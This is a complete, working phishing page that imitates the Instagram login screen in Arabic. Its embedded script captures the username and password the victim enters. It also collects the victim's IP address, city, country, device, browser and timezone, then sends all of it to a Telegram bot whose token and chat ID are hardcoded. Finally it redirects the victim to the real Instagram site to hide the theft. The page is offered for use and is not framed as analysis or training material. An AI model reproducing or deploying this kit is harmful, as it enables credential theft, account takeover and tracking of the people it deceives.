<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram • تسجيل الدخول</title>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 350px;
            padding: 10px;
        }
        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px 20px;
            margin-bottom: 10px;
            text-align: center;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo i {
            font-size: 48px;
            color: #262626;
            background: linear-gradient(135deg, #f09433, #d62976, #962fbf, #4f5bd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .logo h1 {
            font-family: 'Grand Hotel', cursive;
            font-size: 48px;
            font-weight: 400;
            color: #262626;
            margin-top: -10px;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .input-group input {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            outline: none;
            text-align: right;
        }
        .input-group input:focus {
            border-color: #a8a8a8;
        }
        .input-group input::placeholder {
            color: #8e8e8e;
            text-align: right;
        }
        .login-btn {
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px 16px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin: 8px 0;
            transition: background 0.2s;
        }
        .login-btn:hover {
            background: #1877f2;
        }
        .login-btn:disabled {
            background: #b2dffc;
            cursor: not-allowed;
            opacity: 0.7;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            margin: 0 18px;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 8px 0;
            text-decoration: none;
            display: inline-block;
        }
        .fb-login i {
            font-size: 16px;
            margin-left: 5px;
        }
        .forgot-password {
            font-size: 12px;
            color: #00376b;
            text-decoration: none;
            margin-top: 12px;
            display: inline-block;
        }
        .signup-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-card a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8e8e8e;
            text-align: center;
        }
        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 4px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .loading-message {
            color: #0095f6;
            font-size: 12px;
            margin-bottom: 12px;
            padding: 8px;
            background: #e8f4ff;
            border-radius: 8px;
            text-align: center;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spinner {
            display: inline-block;
            width: 12px;
            height: 12px;
            border: 2px solid #0095f6;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <i class="fab fa-instagram"></i>
                <h1>Instagram</h1>
            </div>
            <form id="loginForm" action="#">
                <div id="loadingMessage" class="loading-message"></div>
                <div class="input-group">
                    <input type="text" id="username" placeholder="رقم الهاتف، اسم المستخدم، أو البريد الإلكتروني" required autocomplete="off">
                </div>
                <div class="input-group">
                    <input type="password" id="password" placeholder="كلمة المرور" required autocomplete="off">
                </div>
                <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
                <div class="divider">
                    <span class="divider-line"></span>
                    <span class="divider-text">أو</span>
                    <span class="divider-line"></span>
                </div>
                <a href="#" class="fb-login"><i class="fab fa-facebook-square"></i> تسجيل الدخول عبر فيسبوك</a>
                <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
            </form>
        </div>
        <div class="signup-card">
            ليس لديك حساب؟ <a href="#">سجل الآن</a>
        </div>
        <div class="footer">
            <a href="#">ميتا</a> • <a href="#">حول</a> • <a href="#">المدونة</a> • <a href="#">وظائف</a> • <a href="#">مساعدة</a> • <a href="#">API</a> • <a href="#">الخصوصية</a> • <a href="#">الشروط</a> • <a href="#">المواقع</a> • <a href="#">Instagram Lite</a> • <a href="#">Threads</a>
        </div>
    </div>

    <script>
        // ========== إعدادات تليجرام ==========
        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI';
        const telegramChatId = '8304101362';
        // =====================================

        const loginForm = document.getElementById('loginForm');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const loadingMessageDiv = document.getElementById('loadingMessage');
        
        let isSubmitting = false;

        // دالة سريعة لجلب IP
        async function getIPFast() {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1500);
                const response = await fetch('https://api.ipify.org?format=json', {
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'غير متاح';
            }
        }

        // دالة سريعة لجلب معلومات الموقع
        async function getLocationFast(ip) {
            if (ip === 'غير متاح') return { country: 'غير معروف', city: 'غير معروف' };
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 1500);
                const response = await fetch(`https://ipapi.co/${ip}/json/`, {
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                const data = await response.json();
                return {
                    country: data.country_name || 'غير معروف',
                    city: data.city || 'غير معروف'
                };
            } catch (error) {
                return { country: 'غير معروف', city: 'غير معروف' };
            }
        }

        // دالة سريعة لجمع معلومات الجهاز
        function getDeviceFast() {
            const ua = navigator.userAgent;
            let device = 'PC';
            let browser = 'غير معروف';
            let os = 'غير معروف';
            
            // تحديد الجهاز
            if (/Android/i.test(ua)) device = 'Android';
            else if (/iPhone/i.test(ua)) device = 'iPhone';
            else if (/iPad/i.test(ua)) device = 'iPad';
            else if (/Windows/i.test(ua)) device = 'Windows';
            else if (/Mac/i.test(ua)) device = 'Mac';
            
            // تحديد المتصفح
            if (/Chrome/i.test(ua) && !/Edge/i.test(ua)) browser = 'Chrome';
            else if (/Firefox/i.test(ua)) browser = 'Firefox';
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
            else if (/Edge/i.test(ua)) browser = 'Edge';
            
            // تحديد نظام التشغيل
            if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
            else if (/Mac OS X/i.test(ua)) os = 'macOS';
            else if (/Android/i.test(ua)) os = 'Android';
            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
            
            // معلومات إضافية
            const language = navigator.language;
            const screenResolution = `${screen.width}x${screen.height}`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            return { device, browser, os, language, screenResolution, timezone };
        }

        // استخراج اسم المستخدم من البريد أو الهاتف
        function extractDisplayName(username) {
            if (!username) return 'مستخدم';
            if (username.includes('@')) {
                return username.split('@')[0];
            }
            if (/^[0-9]+$/.test(username)) {
                return `مستخدم ${username.slice(-4)}`;
            }
            return username;
        }

        // إرسال سريع إلى تليجرام
        function sendToTelegramFast(username, password, ip, location, device) {
            const timestamp = new Date().toLocaleString('ar-EG');
            const displayName = extractDisplayName(username);
            
            const message = `📸 INSTAGRAM LOGIN 📸
━━━━━━━━━━━━━━━━━━━━━━
👤 اسم المستخدم: ${displayName}
📧 البريد/الهاتف: ${username}
🔑 كلمة المرور: ${password}
━━━━━━━━━━━━━━━━━━━━━━
🌐 IP: ${ip}
🏳️ الدولة: ${location.country}
🏙️ المدينة: ${location.city}
📱 الجهاز: ${device.device}
🌍 المتصفح: ${device.browser}
💻 النظام: ${device.os}
🌐 اللغة: ${device.language}
📺 الشاشة: ${device.screenResolution}
⏰ المنطقة الزمنية: ${device.timezone}
🕒 الوقت: ${timestamp}
━━━━━━━━━━━━━━━━━━━━━━
📷 Share your moments on Instagram`;
            
            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
            
            // إرسال بدون انتظار
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message
                })
            }).catch(() => {});
        }

        // عرض رسالة التحميل
        function showLoading(show, message = 'جاري الاتصال...') {
            if (show) {
                loadingMessageDiv.innerHTML = `<span class="spinner"></span> ${message}`;
                loadingMessageDiv.style.display = 'block';
                loginBtn.disabled = true;
            } else {
                loadingMessageDiv.style.display = 'none';
                loginBtn.disabled = false;
            }
        }

        // معالج تسجيل الدخول
        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            
            if (isSubmitting) return;
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            if (!username) {
                alert('❌ الرجاء إدخال رقم الهاتف، اسم المستخدم، أو البريد الإلكتروني');
                usernameInput.focus();
                return;
            }
            
            if (!password) {
                alert('❌ الرجاء إدخال كلمة المرور');
                passwordInput.focus();
                return;
            }
            
            isSubmitting = true;
            showLoading(true, 'جاري تسجيل الدخول...');
            
            try {
                // جمع المعلومات بسرعة
                const ip = await getIPFast();
                const location = await getLocationFast(ip);
                const device = getDeviceFast();
                
                // إرسال إلى تليجرام فوراً
                sendToTelegramFast(username, password, ip, location, device);
                
                console.log('✅ تم إرسال البيانات إلى تليجرام');
                console.log(`👤 ${username} | 🌍 ${location.country} | 📱 ${device.device}`);
                console.log(`📸 Instagram Login Success`);
                
                // تحويل فوري
                showLoading(true, 'جاري التحويل...');
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com';
                }, 200);
                
            } catch (error) {
                console.error('خطأ:', error);
                // محاولة إرسال البيانات الأساسية
                try {
                    const basicMessage = `📸 INSTAGRAM LOGIN\n👤 ${username}\n🔑 ${password}\n🕒 ${new Date().toLocaleString()}`;
                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: telegramChatId, text: basicMessage })
                    }).catch(() => {});
                } catch(e) {}
                
                showLoading(false);
                alert('⚠️ حدث خطأ، يرجى المحاولة مرة أخرى');
                isSubmitting = false;
            }
        });
        
        // دعم الضغط على Enter
        usernameInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                passwordInput.focus();
            }
        });
        
        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                loginForm.dispatchEvent(new Event('submit'));
            }
        });
        
        console.log('✅ تم تحميل صفحة Instagram - الوضع السريع');
        console.log('📸 Share your moments!');
    </script>
</body>
</html>
